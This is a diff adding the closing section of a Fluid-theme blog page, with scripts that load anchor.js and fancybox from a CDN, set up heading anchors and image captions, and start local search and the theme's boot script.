+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
